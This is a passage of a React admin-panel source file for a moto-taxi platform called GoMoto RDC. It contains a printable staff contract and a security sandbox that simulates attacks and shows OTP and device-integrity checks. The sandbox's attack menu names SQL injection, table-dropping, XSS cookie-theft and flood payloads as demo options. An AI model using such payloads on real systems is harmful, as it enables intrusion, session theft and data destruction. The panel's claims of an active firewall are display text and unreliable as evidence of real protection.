                <span className="font-mono text-xs font-bold text-slate-400 block">REF : GOMOTO/RDC/2026/CT-{Math.floor(1000 + Math.random() * 9000)}</span>
                <span className="text-[9px] uppercase tracking-wider block font-bold text-indigo-700">Antenne Provinciale : {contractProvince || "Kinshasa"}</span>
              </div>
            </div>

            {/* Armorial and document label */}
            <div className="text-center space-y-2">
              <div className="text-2xl font-black text-indigo-950 uppercase tracking-widest leading-none font-sans">
                ACTE CONSTITUTIONNEL D'ENGAGEMENT PROFESSIONNEL
              </div>
              <p className="text-[9.5px] text-slate-500 uppercase tracking-wider font-extrabold">
                Charte administrative d'Arbitrage et d'Immatriculation de Flottes (GoMoto RDC)
              </p>
            </div>

            {/* Identity context block */}
            <div className="bg-slate-50 p-5 rounded-2xl border border-slate-200 space-y-3">
              <span className="text-[9px] font-black text-indigo-900 uppercase block tracking-wider leading-none">
                I. IDENTIFICATION DU PRESTATAIRE AGRÉÉ PAR L'ÉTAT COMME COLLABORATEUR
              </span>
              
              <div className="grid grid-cols-2 gap-y-2 text-slate-800 text-[11px] leading-relaxed">
                <div>
                  <span className="text-[8.5px] text-slate-400 block uppercase font-mono">Prénom & Nom du signataire</span>
                  <b className="text-indigo-950 text-xs font-black">{contractStaffName || "Délégué non-consigné"}</b>
                </div>
                <div>
                  <span className="text-[8.5px] text-slate-400 block uppercase font-mono">Numéro Carte d'Électeur / Identité</span>
                  <b className="font-mono text-slate-900 font-bold">{contractStaffID || "NON RENSEIGNÉ"}</b>
                </div>
                <div className="mt-1">
                  <span className="text-[8.5px] text-slate-400 block uppercase font-mono">Fonction & Poste Attribué</span>
                  <b className="text-slate-800 font-extrabold">{contractRole || "Collaborateur Exécutif"}</b>
                </div>
                <div className="mt-1">
                  <span className="text-[8.5px] text-slate-400 block uppercase font-mono">Date d'Entrée en Service Économique</span>
                  <b className="font-mono text-slate-800 font-bold">{contractDate || "10 Juin 2026"}</b>
                </div>
              </div>
            </div>

            {/* Clauses of commitment */}
            <div className="space-y-3.5 text-justify text-[9.5px] text-slate-700 leading-relaxed font-sans">
              <span className="text-[9px] font-black text-indigo-900 uppercase block tracking-wider leading-none">
                II. CLAUSES DE CONDUITE, LIMITATIONS OPÉRATIONNELLES ET PROTECTION FINANCIÈRE
              </span>
              
              <p>
                <b>Article 1. Obligation d'Impartialité et d'Arbitrage :</b> En sa qualité de délégataire de la plateforme GoMoto RDC pour la province de {contractProvince || "Kinshasa"}, l'honorable signataire s'engage à traiter toutes les demandes de modification d'identité, d'enrôlement civil bancaire et de retrait avec neutralité. Aucune discrimination basée sur le statut des chauffeurs n'est autorisée.
              </p>
              <p>
                <b>Article 2. Secret Professionnel et Chiffrement :</b> L'agent administratif détient l'accès aux fiches d'enrôlement comprenant des données d'immatriculation d'État, les numéros de comptes Rawbank et de portefeuilles Mobile Money. La divulgation extérieure de ces coordonnées engendre la radiation d'accès et réprobation en conseil étatique.
              </p>
              <p>
                <b>Article 3. Tolérance Zéro Anti-Corruption et Lutte contre les Tracasseries :</b> L’agent s’engage activement à protéger l’intégrité financière du système. Tout abus commis en réclamant des contributions informelles aux conducteurs bloque l'accès administratif interne et fait l'objet de poursuites judiciaires devant l'OPJ.
              </p>
              <p>
                <b>Article 4. Solidarité d'Expansion :</b> L'antenne provinciale locale veille au bon usage des marques distinctives, gilets et casques officiels GoMoto, s'assurant qu'aucun moto-taxi non enregistré n'opère frauduleusement sous le label d'État.
              </p>
              <p>
                <b>Article 5. Séquestre Financier Absolu :</b> L'agent certifie sous serment qu'il ne perçoit ni ne manipule <b>aucun flux monétaire, argent liquide, ni de caution manuelle</b> sous quelque motif que ce soit. La gestion de l'intégralité des finances territoriales relève de l'autorité exclusive du Directeur Général et des Propriétaires de GoMoto RDC SAS.
              </p>
              <p>
                <b>Article 6. Double Signature et Soumission Préalable :</b> Toutes les demandes d'immatriculations, de versements ou de transferts saisies par l'agent sont soumises à titre de brouillon. Elles exigent expressément l'examen, l'approbation formelle et la signature numérique suprême du <b>Directeur Général ou des Propriétaires de GoMoto RDC</b> afin d'être exécutées.
              </p>
              <p>
                <b>Article 7. Unique Canal National Unifié :</b> Afin de centraliser l'assistance et éliminer la fraude provinciale, un <b>numéro de téléphone national unique (+243 89 900 0000)</b> est instauré pour la validation et l'audit de l'ensemble des dossiers à l'échelle du territoire de la RDC.
              </p>
            </div>

            {/* Stamp of signature and dates */}
            <div className="pt-6 border-t border-slate-200 grid grid-cols-2 gap-6 items-start">
              <div className="text-left">
                <span className="text-[8.5px] text-slate-400 block uppercase">Sceau du Bureau Régulateur</span>
                <div className="mt-2 text-indigo-700 font-black tracking-widest text-[11px] leading-tight flex flex-col uppercase">
                  <span>GOMOTO RDC CENTRAL</span>
                  <span>SERVICE CIVIQUE CONGOLAIS</span>
                  <span className="text-[8px] text-slate-400 normal-case italic mt-1 font-bold">Signature d'autorité pré-certifiée</span>
                </div>
              </div>

              <div className="text-right flex flex-col items-end">
                <span className="text-[8.5px] text-slate-400 block uppercase text-right w-full">APPROBATION & SIGNATURE DE L'AGENT</span>
                <span className="text-[9px] text-slate-500 font-mono mt-1 block">Consenti le : {contractDate}</span>
                
                {/* Visual signature placeholder if signed */}
                <div className="mt-2 border border-slate-200 bg-slate-50 p-1 w-44 h-16 rounded flex items-center justify-center relative overflow-hidden">
                  {contractSigned ? (
                    <span className="text-[10px] font-black text-indigo-900 font-mono tracking-widest uppercase rotate-2">
                       {contractStaffName ? contractStaffName.toUpperCase() : "SIGNÉ"}
                    </span>
                  ) : (
                    <span className="text-[8px] text-red-500 font-bold uppercase">NON SIGNÉ PHYSIVEMENT</span>
                  )}
                </div>
              </div>
            </div>

          </div>

          <style>{`
            @media print {
              .no-print {
                display: none !important;
              }
              .print-only {
                display: block !important;
                visibility: visible !important;
                position: absolute !important;
                left: 0 !important;
                top: 0 !important;
                width: 100% !important;
                max-width: 100% !important;
                border: none !important;
                box-shadow: none !important;
              }
              body {
                background: white !important;
                color: black !important;
              }
            }
          `}</style>

        </div>
      )}

      {/* ================= ADMIN TAB 9: SECURITY & WAF SANDBOX ================= */}
      {activeSubTab === "security_waf" && (
        <div className="space-y-6 animate-in fade-in duration-300 text-slate-800 text-left">
          
          <div className="flex justify-between items-start gap-4 flex-wrap bg-white border border-slate-200 p-5 rounded-3xl">
            <div>
              <h3 className="font-bold text-slate-900 text-sm flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-red-650" />
                <span>Bouclier Cyber-Sécurité & Anti-Piratage GoMoto RDC (Portail Admin)</span>
              </h3>
              <p className="text-[10px] text-slate-500 mt-0.5">Système actif de détection des intrusions et de protection contre les utilisateurs malveillants</p>
            </div>
            <span className={`px-3 py-1 rounded-xl text-[9.5px] font-bold uppercase tracking-wider border flex items-center gap-1.5 shadow-sm ${
              integrityStatus === "secure" ? "bg-emerald-50 text-emerald-700 border-emerald-200" :
              integrityStatus === "checking" ? "bg-blue-50 text-blue-700 border-blue-200" : "bg-red-50 text-red-700 border-red-200"
            }`}>
              <span className={`h-2 w-2 rounded-full ${
                integrityStatus === "secure" ? "bg-emerald-500" :
                integrityStatus === "checking" ? "bg-blue-500 animate-ping" : "bg-red-500"
              }`}></span>
              <span>{
                integrityStatus === "secure" ? "SYSTÈME SAIN (WAF ACTIF)" :
                integrityStatus === "checking" ? "ANALYSE D'INTÉGRITÉ EN COURS..." : "ALERTE INTITULÉS SUSPECTS DETECTÉS"
              }</span>
            </span>
          </div>

          {/* Shield info card */}
          <div className="bg-slate-950 p-5 rounded-2xl text-slate-200 space-y-4 shadow-inner relative overflow-hidden">
            <div className="absolute top-0 right-0 p-8 opacity-5">
              <Shield className="w-48 h-48 text-white" />
            </div>
            <div className="flex items-start gap-3.5 relative z-10">
              <div className="bg-[#EF4444]/15 border border-red-500/20 p-2.5 rounded-xl">
                <Server className="w-6 h-6 text-red-500 animate-pulse" />
              </div>
              <div>
                <h4 className="text-xs font-bold uppercase tracking-widest text-slate-300">Pare-feu Applicatif GoMoto (WAF)</h4>
                <p className="text-slate-400 text-[10.5px] leading-relaxed mt-1">
                  Notre moteur cyber-défensif d'État scrute en temps réel chaque interaction (portefeuille, critiques, messageries). 
                  Grâce à un système d'analyse heuristique, il neutralise instantanément les injections SQL, XSS, requêtes DDoS et modders d'APK.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-3 pt-2 text-[10.5px] relative z-10">
              <div className="bg-slate-900 border border-slate-800 p-3 rounded-xl flex items-center gap-2.5">
                <Lock className="w-4 h-4 text-emerald-500 flex-shrink-0" />
                <div>
                  <span className="font-bold block text-slate-300">Sanitizer XSS</span>
                  <span className="text-slate-500 text-[9.5px]">Échappement DOM automatique</span>
                </div>
              </div>
              <div className="bg-slate-900 border border-slate-800 p-3 rounded-xl flex items-center gap-2.5">
                <ShieldAlert className="w-4 h-4 text-red-500 flex-shrink-0" />
                <div>
                  <span className="font-bold block text-slate-300">Anti-SQL Injection</span>
                  <span className="text-slate-500 text-[9.5px]">Validation regex des requêtes</span>
                </div>
              </div>
              <div className="bg-slate-900 border border-slate-800 p-3 rounded-xl flex items-center gap-2.5">
                <Activity className="w-4 h-4 text-blue-500 flex-shrink-0" />
                <div>
                  <span className="font-bold block text-slate-300">Rate Limiter</span>
                  <span className="text-slate-500 text-[9.5px]">Max 10 req/min (Anti-Flood)</span>
                </div>
              </div>
            </div>
          </div>

          {/* Penetration Testing Playground */}
          <div className="bg-red-50 border border-red-200 p-5 rounded-2xl space-y-4">
            <div className="flex items-center gap-2.5">
              <AlertTriangle className="w-5 h-5 text-red-650 flex-shrink-0" />
              <div>
                <h4 className="text-xs font-bold text-slate-900 uppercase tracking-wider">Simulateur de Pénétration Clinique (Zone de Test)</h4>
                <p className="text-[10px] text-slate-500 mt-0.5">Testez notre système de pare-feu en envoyant des payloads corrompus conçus par des hackers</p>
              </div>
            </div>

            <div className="flex gap-2 items-center flex-wrap flex-row">
              <div className="flex-1 min-w-[200px]">
                <select
                  value={selectedSimulatedAttack}
                  onChange={(e) => setSelectedSimulatedAttack(e.target.value)}
                  className="w-full bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs font-bold focus:border-red-650 outline-none text-slate-800 cursor-pointer"
                >
                  <option value="sqli_bypass">SQLi : Contourner l'authentification (' OR 1=1; --)</option>
                  <option value="sqli_ddl">SQLi : Détruire les tables (DROP TABLE Transactions)</option>
                  <option value="xss_cookie_steal">XSS : Voler les cookies de session (document.cookie)</option>
                  <option value="xss_img_onerror">XSS : Injection d'alertes distantes (img onerror)</option>
                  <option value="parameter_negative_recharge">Falsification : Injecter solde négatif (-500 000 CDF)</option>
                  <option value="brute_force_flood">DDoS : Envoyer de fausses requêtes (Flood)</option>
                </select>
              </div>

              <div className="flex gap-2 flex-shrink-0 flex-row">
                <button
                  type="button"
                  onClick={handleExecuteSimulatedAttack}
                  className="bg-red-600 hover:bg-red-700 text-white font-bold py-2.5 px-4.5 rounded-xl text-xs transition-all cursor-pointer flex items-center gap-1.5 shadow"
                >
                  <ShieldAlert className="w-4 h-4" />
                  <span>Lancer l'Attaque</span>
                </button>
                <button
                  type="button"
                  onClick={handleTriggerIntegrityCheck}
                  disabled={isIntegrityChecking}
                  className="bg-slate-200 hover:bg-slate-300 text-slate-705 font-bold py-2.5 px-4.5 rounded-xl text-xs transition-all cursor-pointer flex items-center gap-1.5 disabled:opacity-50"
                >
                  <RotateCcw className={`w-4 h-4 ${isIntegrityChecking ? 'animate-spin' : ''}`} />
                  <span>{isIntegrityChecking ? "Analyse..." : "Scanner Intégrité"}</span>
                </button>
              </div>
            </div>

            {ipBanCountdown > 0 && (
              <div className="bg-amber-50 border border-amber-200 p-3 rounded-lg text-amber-800 text-[10.5px] font-bold animate-pulse flex items-center gap-2">
                <ShieldAlert className="w-4 h-4 text-amber-600" />
                <span>ALERTE DDOS : Attaque par inondation de requêtes détectée. Blocage IP actif, temps restant de mise en quarantaine: {ipBanCountdown}s</span>
              </div>
            )}
          </div>

          {/* Audit Logs Table */}
          <div className="border border-slate-200 rounded-2xl overflow-hidden bg-slate-50">
            <div className="p-4 bg-white border-b border-slate-200 flex justify-between items-center flex-wrap gap-2">
              <span className="text-xs font-bold text-slate-800 flex items-center gap-2">
                <FileText className="w-4 h-4 text-slate-500" />
                <span>Journal de Sécurité & Historique des Attaques (Administratif)</span>
              </span>
              <button
                type="button"
                onClick={() => {
                  setSecurityEvents([]);
                  localStorage.setItem("gomoto_security_events_admin", JSON.stringify([]));
                }}
                className="text-slate-400 hover:text-red-650 transition-all text-[9.5px] uppercase font-bold tracking-widest cursor-pointer"
              >
                Vider l'historique
              </button>
            </div>

            <div className="divide-y divide-slate-100 overflow-x-auto max-h-[300px]">
              {securityEvents.length > 0 ? (
                securityEvents.map((evt) => (
                  <div key={evt.id} className="p-4 bg-white hover:bg-slate-50 transition-all space-y-2">
                    <div className="flex justify-between items-start gap-2">
                      <div className="space-y-0.5">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="font-bold text-xs text-slate-800">{evt.threatType}</span>
                          <span className={`px-1.5 py-0.5 rounded text-[8px] font-extrabold uppercase ${
                            evt.riskScore === "CRITICAL" ? "bg-red-50 text-red-750 border border-red-200" :
                            evt.riskScore === "HIGH" ? "bg-amber-100 text-amber-750 border border-amber-200" : "bg-blue-100 text-blue-755 border"
                          }`}>
                            Niveau {evt.riskScore}
                          </span>
                        </div>
                        <p className="text-[10px] text-slate-400 font-mono">ID: {evt.id} • At: {evt.timestamp}</p>
                      </div>
                      <span className="bg-red-50 text-red-700 font-extrabold px-2 py-0.5 rounded text-[9px] uppercase border border-red-105 flex-shrink-0 font-mono">
                        {evt.actionTaken}
                      </span>
                    </div>

                    <div className="bg-slate-50 p-2.5 rounded-lg border border-slate-200 space-y-1">
                      <p className="text-[10.5px] leading-relaxed text-slate-700">{evt.details}</p>
                      <div className="flex items-center gap-2 text-[9.5px] font-mono text-slate-500 pt-1 border-t border-slate-100">
                        <span className="font-bold text-slate-800">IP Source :</span> <span>{evt.sourceIp}</span>
                      </div>
                      <div className="flex items-center gap-2 text-[9.5px] font-mono text-slate-550 mt-0.5">
                        <span className="font-bold text-slate-800">Payload Bloqué :</span> <span className="bg-red-50 text-red-600 px-1 py-0.5 rounded select-all break-all font-bold font-mono">{evt.rawInput}</span>
                      </div>
                    </div>
                  </div>
                ))
              ) : (
                <div className="p-8 text-center text-xs text-slate-400 font-medium">
                  Aucune tentative d'intrusion signalée ces dernières 24 heures. Plateforme GoMoto RDC Intègre.
                </div>
              )}
            </div>
          </div>

          {/* Detailed Recommendations & Future Proof Security Roadmap */}
          <div className="border border-slate-200 rounded-3xl p-5 bg-blue-50/40 space-y-4">
            <h4 className="text-xs font-bold text-slate-900 uppercase tracking-widest flex items-center gap-1.5">
              <Key className="w-4 h-4 text-blue-600 animate-pulse" />
              <span>Recommandations d'Architecture Cybersécurité pour GoMoto</span>
            </h4>
            <p className="text-[11px] text-slate-650 leading-relaxed">
              Afin de maintenir une robustesse d'État contre les pirates informatiques sur l'environnement de production en RDC, voici nos recommandations de sécurité physique et applicative les plus fiables et sûres :
            </p>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-[11px] pt-1 leading-relaxed">
              <div className="space-y-1 bg-white p-3.5 rounded-xl border border-slate-200 shadow-sm">
                <span className="font-extrabold text-[#1E3A8A] block">1. Authentification Double-Facteur (2FA OTP) :</span>
                <span className="text-slate-600 block">
                  Tout retrait, rechargement d'envergure, ou modification d'informations de profil critique doit lever une validation par jeton éphémère (OTP) par SMS de l'opérateur (Airtel, Vodacom, Orange) pour contrer le détournement de session.
                </span>
              </div>
              <div className="space-y-1 bg-white p-3.5 rounded-xl border border-slate-200 shadow-sm">
                <span className="font-extrabold text-[#1E3A8A] block">2. Attestation d'Intégrité de l'Application (Device Integrity) :</span>
                <span className="text-slate-600 block">
                  Déploiement de Play Integrity (Android) ou DeviceCheck (iOS) pour s'assurer que l'application GoMoto n'a pas été modifiée ou patchée par reverse-engineering, et que l'utilisateur n'opère pas avec des faux GPS (GPS spoofing).
                </span>
              </div>
              <div className="space-y-1 bg-white p-3.5 rounded-xl border border-slate-200 shadow-sm">
                <span className="font-extrabold text-[#1E3A8A] block">3. Cryptographie de Session & Épingle de Certificat (Cert Pinning) :</span>
                <span className="text-slate-650 block">
                  Mise en œuvre du Certificate Pinning SSL pour interdire toute interception de données par Proxy (ex: Man-in-the-Middle) et chiffrement de la mémoire cache locale protégeant les clés sécurisées et soldes des motards.
                </span>
              </div>
              <div className="space-y-1 bg-white p-3.5 rounded-xl border border-slate-200 shadow-sm">
                <span className="font-extrabold text-[#1E3A8A] block">4. Programme National de Bug Bounty :</span>
                <span className="text-slate-650 block">
                  Établir un cadre de divulgation responsable éthique, invitant les chercheurs en cybersécurité congolais et internationaux à tester d'éventuelles failles de GoMoto en échange de récompenses transparentes.
                </span>
              </div>
            </div>
          </div>

          {/* ================= CYBERSECURITY RECOMMENDATIONS INTERACTIVE LANDSCAPE ================= */}
          <div className="border border-slate-200 rounded-3xl p-6 bg-slate-900 text-white space-y-6">
            <div className="flex justify-between items-start gap-4 flex-wrap">
              <div className="text-left">
                <span className="text-[8.5px] font-bold text-indigo-400 uppercase tracking-widest block font-mono">BANC D’ESSAI INTERACTIF</span>
                <h4 className="font-extrabold text-sm text-slate-100 flex items-center gap-1.5 mt-0.5">
                  <ShieldCheck className="w-5 h-5 text-emerald-500 animate-pulse" />
                  <span>Laboratoire Provincial de co-régulation et de Sécurité Applicative</span>
                </h4>
                <p className="text-[10px] text-slate-400 mt-1 font-sans max-w-2xl leading-relaxed">
                  Testez en temps réel l'intégration technique de nos 4 recommandations d'architecture. Simulez des attaques de proxy, des usurpations de localisation GPS ou des réceptions d'OTP SMS pour certifier la robustesse d'État de GoMoto RDC.
                </p>
              </div>
            </div>

            {/* Simulating active SMS OTP warning notifications on screen to look extremely futuristic and real! */}
            {recOtpNotify && (
              <div className="bg-amber-955/75 border border-amber-500/30 text-amber-300 p-3 rounded-2xl text-[10.5px] flex items-center gap-2.5 animate-bounce font-sans text-left">
                <Smartphone className="w-4 h-4 text-amber-400 shrink-0 animate-ping" />
                <div className="flex-1">
                  <span className="font-extrabold block text-[9.5px] text-amber-400 font-mono font-bold">NOTIF SIMULÉE DE TÉLÉPHONE (SMS ENTRANT RDC) :</span>
                  <span>{recOtpNotify}</span>
                </div>
                <button type="button" onClick={() => setRecOtpNotify(null)} className="text-amber-505 hover:text-amber-300 font-bold p-1">×</button>
              </div>
            )}

            {/* Sandbox Tabs */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-2 bg-slate-950 p-1 rounded-2xl border border-slate-800">
              <button
                type="button"
                onClick={() => setActiveSandboxTab("otp")}
                className={`py-2 px-3 rounded-xl text-[10.5px] font-bold uppercase transition-all tracking-wider cursor-pointer flex items-center justify-center gap-1.5 ${
                  activeSandboxTab === "otp"
                    ? "bg-indigo-600 text-white shadow-md font-sans"
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-900"
                }`}
              >
                <Smartphone className="w-4 h-4" />
                <span>1. 2FA OTP SMS</span>
              </button>

              <button
                type="button"
                onClick={() => setActiveSandboxTab("integrity")}
                className={`py-2 px-3 rounded-xl text-[10.5px] font-bold uppercase transition-all tracking-wider cursor-pointer flex items-center justify-center gap-1.5 ${
                  activeSandboxTab === "integrity"
                    ? "bg-indigo-600 text-white shadow-md font-sans"
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-900"
                }`}
              >
                <ShieldCheck className="w-4 h-4" />
                <span>2. Device Integrity</span>
              </button>

              <button
                type="button"
                onClick={() => setActiveSandboxTab("pinning")}
                className={`py-2 px-3 rounded-xl text-[10.5px] font-bold uppercase transition-all tracking-wider cursor-pointer flex items-center justify-center gap-1.5 ${
                  activeSandboxTab === "pinning"
                    ? "bg-indigo-600 text-white shadow-md font-sans"
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-900"
                }`}
              >
                <Lock className="w-4 h-4" />
                <span>3. Cert Pinning</span>
              </button>

              <button
                type="button"
                onClick={() => setActiveSandboxTab("bounty")}
                className={`py-2 px-3 rounded-xl text-[10.5px] font-bold uppercase transition-all tracking-wider cursor-pointer flex items-center justify-center gap-1.5 ${
                  activeSandboxTab === "bounty"
                    ? "bg-indigo-600 text-white shadow-md font-sans"
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-900"
                }`}
              >
                <Activity className="w-4 h-4" />
                <span>4. Bug Bounty Portal</span>
              </button>
            </div>

            {/* Tab content wrapper */}
            <div className="bg-slate-950/40 border border-slate-800 p-5 rounded-2xl text-left">
              
              {/* TAB 1: 2FA OTP SIMULATOR */}
              {activeSandboxTab === "otp" && (
                <div className="space-y-4 animate-in fade-in duration-200">
                  <div className="flex justify-between items-start gap-4 flex-wrap border-b border-slate-805 pb-3">
                    <div>
                      <h5 className="font-extrabold text-[12px] text-indigo-405 uppercase tracking-widest font-mono">1. VALIDATION DOUBLE FACTEUR DE RETRAIT PAR SMS OTP</h5>
                      <p className="text-[10px] text-slate-400 font-sans mt-0.5">Prévient les piratages de comptes chauffeurs et les retraits d'argent non-autorisés.</p>
                    </div>
                    <span className="bg-indigo-900/40 text-indigo-300 font-bold px-2 py-0.5 rounded text-[8.5px] border border-indigo-800 uppercase tracking-wide">Airtel / Orange / Vodacom</span>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-1">
                    <div className="space-y-3">
                      <div className="space-y-1">
                        <label className="text-[9.5px] font-extrabold text-slate-350 block uppercase tracking-wide font-sans">Numéro de Téléphone du bénéficiaire (RDC) :</label>
                        <input
                          type="text"
                          value={recOtpPhone}
                          onChange={(e) => setRecOtpPhone(e.target.value)}
                          placeholder="+243 998 440 119"
                          className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white font-mono placeholder-slate-600 outline-none focus:border-indigo-550"
                        />
                      </div>

                      <div className="space-y-1">
                        <label className="text-[9.5px] font-extrabold text-slate-355 block uppercase tracking-wide font-sans">Opérateur Téléphonique Connecté :</label>
                        <div className="grid grid-cols-3 gap-2">
                          {(["airtel", "vodacom", "orange"] as const).map((op) => (
                            <button
                              type="button"
                              key={op}
                              onClick={() => setRecOtpCarrier(op)}
                              className={`py-1 rounded-lg text-[9.5px] font-bold font-mono uppercase tracking-wider border cursor-pointer transition-all ${
                                recOtpCarrier === op
                                  ? "bg-[#1E3A8A] border-indigo-500 text-indigo-200"
                                  : "bg-slate-900 border-slate-800 text-slate-450 hover:bg-slate-850"
                              }`}
                            >
                              {op}
                            </button>
                          ))}
                        </div>
                      </div>

                      <button
                        type="button"
                        onClick={handleSendOtp}
                        className="w-full py-2 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs uppercase rounded-xl transition-all shadow-md flex justify-center items-center gap-1.5 cursor-pointer"
                      >
                        <Smartphone className="w-3.5 h-3.5" />
                        <span>Déclencher l'envoi du Jeton (SMS)</span>
                      </button>
                    </div>

                    <div className="bg-slate-900/50 p-4 rounded-xl border border-slate-805 flex flex-col justify-between space-y-4">
                      <div className="space-y-1 text-center py-2">
                        <span className="text-[9px] text-slate-400 block uppercase tracking-widest font-mono">Veuillez entrer le code reçu :</span>
                        
                        <div className="flex justify-center gap-2 mt-2">
                          <input
                            type="text"
                            maxLength={6}
                            value={recEnteredOtp}
                            onChange={(e) => setRecEnteredOtp(e.target.value)}
                            placeholder="------"
                            className="w-32 text-center bg-slate-950 border border-slate-800 rounded-xl py-2.5 text-base font-mono font-extrabold tracking-widest text-amber-500 outline-none"
                          />
                        </div>
                      </div>

                      <div className="space-y-2">
                        {recOtpStatus === "idle" && (
                          <div className="text-center text-[9.5px] text-slate-500 italic">En attente d’envoi d’un jeton de sécurité...</div>
                        )}
                        {recOtpStatus === "sent" && (
                          <div className="space-y-2">
                            <button
                              type="button"
                              onClick={handleVerifyOtp}
                              className="w-full py-1.5 bg-yellow-650 hover:bg-yellow-700 text-slate-950 font-bold text-[10.5px] uppercase rounded-lg transition-all flex justify-center items-center gap-1 cursor-pointer"
                            >
                              <span>Valider la transaction</span>
                            </button>
                            <span className="text-[8.5px] text-slate-400 block text-center">Un SMS d'État a été virtuellement envoyé sur le téléphone du pilote.</span>
                          </div>
                        )}
                        {recOtpStatus === "success" && (
                          <div className="bg-emerald-950/40 border border-emerald-500/20 text-emerald-300 p-2.5 rounded-lg text-[10px] text-center font-bold font-sans">
                            ✓ AUTHENTIFICATION RÉUSSIE !<br />
                            <span className="font-normal font-mono text-[9px] text-slate-350">Transaction sécurisée validée par double authentification GoMoto.</span>
                          </div>
                        )}
                        {recOtpStatus === "invalid" && (
                          <div className="space-y-2">
                            <div className="bg-red-955/55 border border-red-500/20 text-red-300 p-2.5 rounded-lg text-[10px] text-center font-bold font-sans">
                              ✗ CODE OTP INVALIDE OU USURPÉ !<br />
                              <span className="font-normal font-mono text-[9px] text-slate-300 font-medium">Soupçon de détournement. L'autorisation d'écriture de solde est bloquée d'État.</span>
                            </div>
                            <button
                              type="button"
                              onClick={() => {
                                setRecEnteredOtp("");
                                setRecOtpStatus("sent");
                              }}
                              className="w-full text-center text-[9px] text-indigo-400 hover:underline cursor-pointer"
                            >
                              Réessayer la saisie de l'OTP
                            </button>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* TAB 2: DEVICE PLAY INTEGRITY & ANTI SPOOFING */}
              {activeSandboxTab === "integrity" && (
                <div className="space-y-4 animate-in fade-in duration-200">
                  <div className="flex justify-between items-start gap-4 flex-wrap border-b border-slate-805 pb-3">
                    <div>
                      <h5 className="font-extrabold text-[12px] text-indigo-405 uppercase tracking-widest font-mono">2. ATTESTATION GOOGLE PLAY INTEGRITY ET DÉTECTION GPS COHÉRENCE</h5>
                      <p className="text-[10px] text-slate-400 font-sans mt-0.5">Vérifie l'authenticité de l'application et décourage les tricheries de faux GPS par les chauffeurs.</p>
                    </div>
                    <span className="bg-slate-900 border border-slate-800 text-slate-300 font-bold px-2 py-0.5 rounded text-[8.5px] uppercase font-mono">Anti-GPS Spoofing d'État</span>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-1">
                    <div className="space-y-3">
                      <span className="text-[9px] text-indigo-400 block font-bold font-mono uppercase tracking-wide font-semibold">Déclencheurs d’Attestation d’Intégrité :</span>
                      
                      <div className="grid grid-cols-1 gap-2 text-[10.5px]">
                        <button
                          type="button"
                          disabled={recPlayIntActive}
                          onClick={() => runPlayIntegrityCheck("none")}
                          className="w-full py-2 bg-emerald-950/40 hover:bg-emerald-900/30 text-emerald-400 hover:text-emerald-300 border border-emerald-800/40 rounded-xl transition-all cursor-pointer flex items-center justify-between px-3 disabled:opacity-50"
                        >
                          <span className="font-extrabold">✓ Évaluer un périphérique sain (Standard)</span>
                          <span className="bg-emerald-900 border border-emerald-700 px-1.5 py-0.5 rounded text-[8.5px] font-mono font-bold">SAIN</span>
                        </button>

                        <button
                          type="button"
                          disabled={recPlayIntActive}
                          onClick={() => runPlayIntegrityCheck("spoof")}
                          className="w-full py-2 bg-amber-955/40 hover:bg-amber-900/30 text-amber-400 hover:text-amber-300 border border-amber-805/40 rounded-xl transition-all cursor-pointer flex items-center justify-between px-3 disabled:opacity-50"
                        >
                          <span className="font-extrabold">⚠️ Évaluer périphérique avec GPS Spoofed (Faux GPS)</span>
                          <span className="bg-amber-900 border border-amber-700 px-1.5 py-0.5 rounded text-[8.5px] font-mono font-bold">FRAUDE</span>
                        </button>

                        <button
                          type="button"
                          disabled={recPlayIntActive}
                          onClick={() => runPlayIntegrityCheck("root")}
                          className="w-full py-2 bg-red-955/40 hover:bg-red-900/30 text-red-400 hover:text-red-300 border border-red-805/40 rounded-xl transition-all cursor-pointer flex items-center justify-between px-3 disabled:opacity-50"
                        >
                          <span className="font-extrabold">🚨 Évaluer périphérique ROOTÉ / Modifié (Infrac.)</span>
                          <span className="bg-red-900 border border-red-700 px-1.5 py-0.5 rounded text-[8.5px] font-mono font-bold">ROOT</span>
                        </button>
                      </div>
                    </div>

                    <div className="bg-slate-900/50 p-4 rounded-xl border border-slate-800 flex flex-col justify-center space-y-4">
                      {recPlayIntResult === "idle" && !recPlayIntActive && (
                        <div className="text-center text-slate-450 text-[10.5px] italic py-8">
                          Cliquez sur un des scénarios à gauche pour exécuter l'automate d'évaluation d'intégrité de la voirie mobile.
                        </div>
                      )}

                      {recPlayIntActive && (
                        <div className="space-y-3 py-2 text-left">
                          <div className="flex items-center gap-2">
                            <RefreshCw className="w-4 h-4 text-indigo-400 animate-spin" />
                            <span className="text-[11px] font-extrabold text-indigo-300 font-mono">Analyse d'intégrité en cours...</span>
                          </div>
                          
                          <div className="space-y-1.5 text-[9.5px] font-sans text-slate-405 leading-none">
                            <p className={recPlayIntStep >= 1 ? "text-emerald-400 font-semibold" : "text-slate-600"}>
                              {recPlayIntStep >= 1 ? "✓ Connecté" : "○ En attente"} : Connexion à Google Play Services API d'État.
                            </p>
                            <p className={recPlayIntStep >= 2 ? "text-emerald-400 font-semibold" : "text-slate-600"}>
                              {recPlayIntStep >= 2 ? "✓ Réussi" : "○ En attente"} : Validation de l'empreinte de signature GoMoto.
                            </p>
                            <p className={recPlayIntStep >= 3 ? "text-emerald-400 font-semibold" : "text-slate-600"}>
                              {recPlayIntStep >= 3 ? "✓ Réussi" : "○ En attente"} : Recherche de privilèges SuperUser ou Magisk.
                            </p>
                            <p className={recPlayIntStep >= 4 ? "text-emerald-400 font-semibold" : "text-slate-600"}>
                              {recPlayIntStep >= 4 ? "✓ Réussi" : "○ En attente"} : Vérification des décalages d'heure et Localisation Mockée.
                            </p>
                          </div>
                        </div>
                      )}

